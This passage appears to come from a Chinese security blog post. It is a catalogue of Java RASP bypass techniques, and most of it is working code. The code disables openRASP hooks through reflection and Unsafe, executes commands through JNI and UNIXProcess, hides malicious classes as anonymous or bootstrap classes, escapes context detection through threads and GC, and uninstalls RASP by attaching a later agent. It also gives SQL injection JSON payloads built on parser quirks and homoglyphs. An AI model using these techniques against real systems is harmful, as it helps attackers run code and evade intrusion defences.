+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Library.initialize(<span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">long</span> pool = Pool.create(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">long</span> proc = Proc.alloc(pool);</span><br><span class="line">Proc.create(proc, <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>, <span class="keyword">new</span> String[]&#123;&#125;, <span class="keyword">new</span> String[]&#123;&#125;, Procattr.create(pool), pool);</span><br></pre></td></tr></table></figure>
+<h4 id="基于反射破坏RASP运行时结构"><a href="#基于反射破坏RASP运行时结构" class="headerlink" title="基于反射破坏RASP运行时结构"></a>基于反射破坏RASP运行时结构</h4><p>openRASP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">Field used = clazz.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">used.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object enableHook = used.get(<span class="keyword">null</span>);</span><br><span class="line">Method setMethod = AtomicBoolean.class.getDeclaredMethod(<span class="string">&quot;set&quot;</span>,<span class="keyword">boolean</span>.class);</span><br><span class="line">setMethod.invoke(enableHook,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="冰蝎-哥斯拉在RASP对抗上做了什么"><a href="#冰蝎-哥斯拉在RASP对抗上做了什么" class="headerlink" title="冰蝎\哥斯拉在RASP对抗上做了什么"></a>冰蝎\哥斯拉在RASP对抗上做了什么</h4><p>早先版本的哥斯拉命令执行堆栈，</p>
+<img src="/2023/06/11/rasp_tricks/4.png" class="" title="img4">
+<p>早先版本的冰蝎命令执行堆栈，</p>
+<img src="/2023/06/11/rasp_tricks/5.png" class="" title="img5">
+<p>新版本哥斯拉命令执行堆栈，不再使用老版本固定规则，而使用了随机且具有较高欺骗性的堆栈，</p>
+<img src="/2023/06/11/rasp_tricks/6.png" class="" title="img6">
+<p>哥斯拉的413个高欺骗性堆栈名字典，生成payload的时候会从中随机选取，</p>
+<img src="/2023/06/11/rasp_tricks/7.png" class="" title="img7">
+<p>新版本冰蝎在生产恶意类时，class名会随机生成，</p>
+<img src="/2023/06/11/rasp_tricks/8.png" class="" title="img8">
+<img src="/2023/06/11/rasp_tricks/9.png" class="" title="img9">
+
+<h2 id="高对抗场景下的tricks简介"><a href="#高对抗场景下的tricks简介" class="headerlink" title="高对抗场景下的tricks简介"></a>高对抗场景下的tricks简介</h2><h3 id="BootStrap简介"><a href="#BootStrap简介" class="headerlink" title="BootStrap简介"></a>BootStrap简介</h3><h4 id="BootStrap下的class具有什么特权"><a href="#BootStrap下的class具有什么特权" class="headerlink" title="BootStrap下的class具有什么特权"></a>BootStrap下的class具有什么特权</h4><p>ClassLoader为空，有效隐蔽了很多信息。</p>
+<img src="/2023/06/11/rasp_tricks/10.png" class="" title="img10">
+<p>比较具有代表性的案例是，现阶段很多内存马检测插件，都需要先获取被检测Class的ClassLoader，只有ClassLoader不为空，再进行该Class是否落盘的检测，如果没落盘，则认为可能是内存马。</p>
+<img src="/2023/06/11/rasp_tricks/11.png" class="" title="img11">
+<p>可以不基于反射调用很多高危函数。</p>
+<img src="/2023/06/11/rasp_tricks/12.png" class="" title="img12">
+<h4 id="如何使自定义class的classLoader成为BootStrap"><a href="#如何使自定义class的classLoader成为BootStrap" class="headerlink" title="如何使自定义class的classLoader成为BootStrap"></a>如何使自定义class的classLoader成为BootStrap</h4><p>首先需要将进行利用的Class包在一起打成jar。</p>
+<p>Instrumentation的API<br>Instrumentation.appendToBootstrapClassLoaderSearch提供将jar包加入到BootStrap的函数。</p>
+<img src="/2023/06/11/rasp_tricks/13.png" class="" title="img13">
+<p>现有JDK目录下jar替换，将恶意类打包成charsets.jar（别的也行，最好选取使用频率较低的jar，并且要求这个BootStrap下的jar不是JDK启动时就load的），且需要一个文件上传或覆盖相关的漏洞将$JAVA_HOME/jre/lib/charsets.jar进行覆盖即可。</p>
+<img src="/2023/06/11/rasp_tricks/14.png" class="" title="img14">
+<p>在jre/classes/ 下上传的恶意class的Classloader均为null。</p>
+<h3 id="UnSafe简介"><a href="#UnSafe简介" class="headerlink" title="UnSafe简介"></a>UnSafe简介</h3><h4 id="UnSafe能够做什么"><a href="#UnSafe能够做什么" class="headerlink" title="UnSafe能够做什么"></a>UnSafe能够做什么</h4><img src="/2023/06/11/rasp_tricks/15.png" class="" title="img15">
+<p>基于JNI的命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String cmd = <span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">int</span>[] ineEmpty = &#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">Unsafe unsafe = Utils.getUnsafe();</span><br><span class="line">Object obj = unsafe.allocateInstance(clazz);</span><br><span class="line">Field helperpath = clazz.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">helperpath.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object path = helperpath.get(obj);</span><br><span class="line"><span class="keyword">byte</span>[] prog = <span class="string">&quot;/bin/bash\u0000&quot;</span>.getBytes();</span><br><span class="line">String paramCmd = <span class="string">&quot;-c\u0000&quot;</span> + cmd + <span class="string">&quot;\u0000&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] argBlock = paramCmd.getBytes();</span><br><span class="line"><span class="keyword">int</span> argc = <span class="number">2</span>;</span><br><span class="line">Method exec = clazz.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">exec.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">exec.invoke(obj, <span class="number">2</span>, path, prog, argBlock, argc, <span class="keyword">null</span>, <span class="number">0</span>, <span class="keyword">null</span>, ineEmpty, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<p>通过反射，也可以对运行时相关变量进行修改。（相当于破坏RASP运行时结构的另一种手法）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">Unsafe unsafe = getUnsafe();</span><br><span class="line">InputStream inputStream = clazz.getResourceAsStream(clazz.getSimpleName() + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"><span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[inputStream.available()];</span><br><span class="line">inputStream.read(data);</span><br><span class="line">Class anonymousClass = unsafe.defineAnonymousClass(clazz, data, <span class="keyword">null</span>);</span><br><span class="line">Field field = anonymousClass.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">unsafe.putObject(clazz, unsafe.staticFieldOffset(field), <span class="keyword">new</span> AtomicBoolean(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>
+<p>对生成的恶意类进行隐藏。通过defineAnonymousClass生成的VM Anonymous Class具备如下特征：</p>
+<ol>
+<li>class名可以是已存在的class的名字，比如java.lang.File，即使如此也不会发生任何问题，java的动态编译特性将会在内存中生成名如 java.lang.File/13063602@38ed5306的class。  —将会使类名极具欺骗性</li>
+<li>该class的classloader为null。  —在java中classloader为null的为来自BootstrapClassLoader的class，往往会被认定为jdk自带class</li>
+<li>在JVM中存在大量动态编译产生的class（多为lamada表达式生成），这种class均不会落盘，所以不落盘并不会属于异常特征。 </li>
+<li>无法通过Class.forName()获取到该class的相关内容。 —严重影响通过反射排查该类安全性的检测工具</li>
+<li>在部分jdk版本中，VM Anonymous Class甚至无法进行restransform。 —这也就意味着我们无法通过attach API去修复这个恶意类</li>
+<li>该class在transform中的className将会是它的模板类名。 —这将会对那些通过attach方式检测内存马的工具造成极大的误导性<h4 id="获取UnSafe的手法"><a href="#获取UnSafe的手法" class="headerlink" title="获取UnSafe的手法"></a>获取UnSafe的手法</h4>基于反射获取（很多RASP、木马检测已把反射获取UnSafe拉黑），<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title">getUnsafe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Unsafe unsafe = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            unsafe = (Unsafe) field.get(<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+unsafe本身在大量主流框架中都有使用（如gson、netty等），所以完全可以通过反射获取别的框架已经创建好的现成的unsafe变量，甚至直接调用这些框架写好的重新打包的unsafe相关的API<img src="/2023/06/11/rasp_tricks/16.png" class="" title="img16">
+想办法制造BootStrap恶意类，直接通过Unsafe.getUnsafe()来获取UnSafe。<h2 id="一些特殊场景下的RASP绕过手法"><a href="#一些特殊场景下的RASP绕过手法" class="headerlink" title="一些特殊场景下的RASP绕过手法"></a>一些特殊场景下的RASP绕过手法</h2></li>
+</ol>
+<h3 id="兼容性差异"><a href="#兼容性差异" class="headerlink" title="兼容性差异"></a>兼容性差异</h3><p>大部分RASP不会自写json解析引擎，而会去选择RASP使用的语言的先有json解析框架，以JAVA为例，大部分RASP框架会选用Gson（好用又安全）作为自己的json解析框架，而应用往往选择的json解析框架是不确定的（fastjson、gson、jackson都有可能），那么如果一旦一个应用使用的json解析框架的兼容性大于了RASP使用框架的兼容性，绕过就会存在。</p>
+<p>举例说明，fastjson作为一款主流json解析框架，兼容性是比gson高的。其中fastjson支持在不同k-v之间插上任意数量的逗号，而Gson不支持，那么当需要解析参数的相关漏洞（SQL注入、SSRF）存在RASP防御，一下手法就可以绕过RASP的防御。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;,,,,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;glassy&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span>,,,<span class="attr">&quot;content&quot;</span>:<span class="string">&quot;test&quot;</span>,,&#125;</span><br></pre></td></tr></table></figure>
+<p>再举一个例子，fastjson在支持数据的unicode编码的同事，对于\u后面的数字，是支持异性字的，而gson和jackson仅仅支持unicode编码，却并不支持\u后面的数字的异性字，这样的话，可以构造出极具欺骗性的payload，技能欺骗RASP又能欺骗WAF。<br>通过异形字构造出的json数据如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json数据：&#123;<span class="attr">&quot;\u౦᥆༦۳\u꘠០६f\u꯰꧐໖e\u౦꣐꘧᪄\u꯰༠߆५\u૦၀६e\u๐᥆꤇꯴&quot;</span>:<span class="string">&quot;\u᮰߀٧൪\u໐୦᱆૮\u꣐០႖߉\u੦᠐௭౩\u၀୦꧒๐\u٠૦೬߉\u᮰୦೭߃\u᱀०٢۰\u೦൦൬୭\u୦൦᧖c\u០૦۶᱁\u᧐႐୭٣\u០᱐᧗౩\u০᱀۷᪙&quot;</span>,<span class="attr">&quot;\u၀꯰꩖e\u႐꘠७꧕\u᥆୦༦d&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">json反序列化为的Object：&#123;<span class="attr">&quot;num&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;content&quot;</span>:<span class="string">&quot;this is glassy&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="突破语义分析"><a href="#突破语义分析" class="headerlink" title="突破语义分析"></a>突破语义分析</h3><p>传统意义上的SQL注入绕过，在于寻觅黑名单之外的敏感函数、大量编码、注释引起的混淆等，但是语义分析层面上，由于关注的是语义结构的变化，那么以上手法往往会比较无力。下面的示例中会展示如何突破Druid的语义分析防御。<br>基于未兼容关键字<br>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据。而Druid的最新版本也未兼容handler关键字，那么若遇到使用Druid进行语义分析的RASP，便可以使用Handler关键字破坏语义分析引擎运行。</p>
+<img src="/2023/06/11/rasp_tricks/17.png" class="" title="img17">
+<h3 id="巧妙利用熔断"><a href="#巧妙利用熔断" class="headerlink" title="巧妙利用熔断"></a>巧妙利用熔断</h3><p>处于性能相关的考虑，很多RASP产品存在性能相关防护（一般默认关闭），为了防止RASP对业务性能造成较大影响，当整机CPU到达某个阈值的情况下，RASP往往会自动熔断。</p>
+<img src="/2023/06/11/rasp_tricks/18.png" class="" title="img18">
+<p>基于此特性，在部署RASP的应用上，可以尝试猛打某一条payload，把机器CPU打到RASP熔断的阈值，便可以成功绕过RASP防御。在拥有代码执行权限的情况下，完全可以刻意构造高性能消耗代码做到一条payload（如复杂正则、循环堆栈获取）即可成功让RASP熔断并执行命令。</p>
+<h3 id="还是熟悉的大包绕过"><a href="#还是熟悉的大包绕过" class="headerlink" title="还是熟悉的大包绕过"></a>还是熟悉的大包绕过</h3><p>众所周知，WAF的防御经常收到大包绕过的困扰，无独有偶，RASP也会面临同样的问题。但二者在原理上有着本质的区别。<br>WAF的大包绕过主要由于WAF本身的性能问题。<br>而RASP的大包问题，则出于内存保护考虑。不过，一般较为成熟的RASP会把自己的最大body读取设置为一个中间件能承受的最大body以上，但是一旦中间件有过特殊配置，或是一些对最大body未做限制的中间件，那么RASP便存在被打包绕过的可能性。</p>
+<h3 id="JDK官方提供的JNI-HOOK方案绕过"><a href="#JDK官方提供的JNI-HOOK方案绕过" class="headerlink" title="JDK官方提供的JNI HOOK方案绕过"></a>JDK官方提供的JNI HOOK方案绕过</h3><p>JDK官方提供了setNativeMethodPrefix作为Hook JNI的一种手段。很多插桩类产品，使用该方案解决JNI的埋点问题。</p>
+<img src="/2023/06/11/rasp_tricks/19.png" class="" title="img19">
+<img src="/2023/06/11/rasp_tricks/20.png" class="" title="img20">
+<p>此功能允许指定前缀并进行适当的分辨率。 具体而言，当标准分辨率失败时，考虑前缀重试分辨率。 有两种方法可以解决分辨率，使用JNI功能RegisterNatives显式分辨，以及正常的自动分辨率。 对于RegisterNatives ，JVM将尝试此关联：<br>   method(foo) -&gt; nativeImplementation(foo)<br>如果失败，将使用前缀为方法名称的指定前缀重试分辨率，从而产生正确的分辨率：</p>
+<p>   method(wrapped_foo) -&gt; nativeImplementation(foo)  </p>
+<p>对于自动解析，JVM将尝试：</p>
+<p>   method(wrapped_foo) -&gt; nativeImplementation(wrapped_foo) </p>
+<p>如果失败，将使用从实现名称中删除的指定前缀重试解决方案，从而产生正确的解决方案：</p>
+<p>   method(wrapped_foo) -&gt; nativeImplementation(foo)  </p>
+<p>请注意，由于前缀仅在标准分辨率失败时使用，因此可以选择性地包装本机方法。</p>
+<p>因此，若RASP使用的是setNativeMethodPrefix的方式去解决jni的HOOK，那攻击者无需再去纠结于调用exec函数，而直接选择调用 glassy_exec函数即可绕过。</p>
+<h3 id="黑名单绕过手段"><a href="#黑名单绕过手段" class="headerlink" title="黑名单绕过手段"></a>黑名单绕过手段</h3><p>存在部分RASP，仅仅进行黑名单\白名单进行安全防护，这种防护方式非常无脑，但在很多场景下效果都还不错。但我们可以有多种方法使得我们执行的命令不再是黑名单命令。</p>
+<p>当应用存在的漏洞是一个代码执行漏洞，而 /bin/bash 命令被拉黑了的时候，我们通过Java的代码可以创造一个新的bash。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//copy方式</span></span><br><span class="line">Files.copy(Paths.get(<span class="string">&quot;/bin/bash&quot;</span>), Paths.get(<span class="string">&quot;/tmp/glassy&quot;</span>));</span><br><span class="line"><span class="comment">//软连接方式</span></span><br><span class="line">Files.createSymbolicLink(Paths.get(<span class="string">&quot;/tmp/amadeus&quot;</span>), Paths.get(<span class="string">&quot;/bin/bash&quot;</span>));</span><br><span class="line"><span class="comment">//硬链接方式</span></span><br><span class="line">Files.createLink(Paths.get(<span class="string">&quot;/tmp/amadeus&quot;</span>), Paths.get(<span class="string">&quot;/bin/bash&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>接下来就可以使用一个非黑名单的bash文件进行相关操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;/tmp/glassy -c XXXX&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>当然在命令执行的时候，cp\alias\export若不在黑名单里，则可以不依赖Java API也能实现类似效果。</p>
+<h3 id="上下文检测逃逸"><a href="#上下文检测逃逸" class="headerlink" title="上下文检测逃逸"></a>上下文检测逃逸</h3><p>基于新建线程实现上下文逃逸</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewThread</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">            Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        t.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>基于线程池实现上下文逃逸</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ExecutorService newCachedThreadPool = Executors.newCachedThreadPool();</span><br><span class="line">            newCachedThreadPool.execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>基于gc实现上下文逃逸</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.WeakReference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestGc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestGc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>);</span><br><span class="line">        <span class="keyword">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        TestGc testGc = <span class="keyword">new</span> TestGc();</span><br><span class="line">        WeakReference&lt;TestGc&gt; weakPerson = <span class="keyword">new</span> WeakReference&lt;TestGc&gt;(testGc);</span><br><span class="line">        testGc = <span class="keyword">null</span>;</span><br><span class="line">        System.gc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="花式卸载RASP"><a href="#花式卸载RASP" class="headerlink" title="花式卸载RASP"></a>花式卸载RASP</h3><p>很多Java应用中，存在着多个Java Agent的情况，比如，有一些Java应用既安装了APM、又安装了RASP，Java的Instrument在处理众多的Agent的时候，会根据加载顺序，依次调用对应的Transformer，那么只要能够保证最后一个加载的Agent，那么就拥有被加强Class的字节码的最终决定权。</p>
+<p>当取到一个代码执行权限后，完全可以做到新Attach一个Agent（此时这个Agent晚于RASP），再将由RASP增强的Class字节码还原回没有安全防护的字节码。（这里会有高版本JDK禁止attach self问题，但该防护也能通过反射关闭。）<br>Attach相关代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String path = System.getenv(<span class="string">&quot;JAVA_HOME&quot;</span>) + <span class="string">&quot;/lib/tools.jar&quot;</span>;</span><br><span class="line">String pid = java.lang.management.ManagementFactory.getRuntimeMXBean().getName().split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">String payload = <span class="string">&quot;uninstall.jar&quot;</span>;</span><br><span class="line">ClassLoader classLoader = getCustomClassloader(<span class="keyword">new</span> String[]&#123;path&#125;);</span><br><span class="line">Class virtualMachineClass = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">Object virtualMachine = invokeStaticMethod(virtualMachineClass, <span class="string">&quot;attach&quot;</span>, <span class="keyword">new</span> Object[]&#123;pid&#125;);</span><br><span class="line">invokeMethod(virtualMachine, <span class="string">&quot;loadAgent&quot;</span>, <span class="keyword">new</span> Object[]&#123;payload&#125;);</span><br><span class="line">invokeMethod(virtualMachine, <span class="string">&quot;detach&quot;</span>, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+<p>uninstall.jar相关代码（卸载了命令执行、文件操作相关的防护）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; uninstallClass = Arrays.asList(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>, <span class="string">&quot;java.io.FileInputStream&quot;</span>, <span class="string">&quot;java.io.File&quot;</span>, <span class="string">&quot;java.io.FileOutputStream&quot;</span>, <span class="string">&quot;java.nio.file.Files&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                        Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                        <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String name = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (uninstallClass.contains(name)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Got it in retransformClasses !!! &quot;</span> + className);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassPool pool = ClassPool.getDefault();</span><br><span class="line">                CtClass ctClass = pool.get(name);</span><br><span class="line">                <span class="keyword">byte</span>[] oldByte = ctClass.toBytecode();</span><br><span class="line">                <span class="keyword">if</span> (!Arrays.equals(oldByte, classfileBuffer)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Do repair for transform class !!! ClassName: &quot;</span> + className);</span><br><span class="line">                    <span class="keyword">return</span> oldByte;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Error in transform !!! ClassName: &quot;</span> + className);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
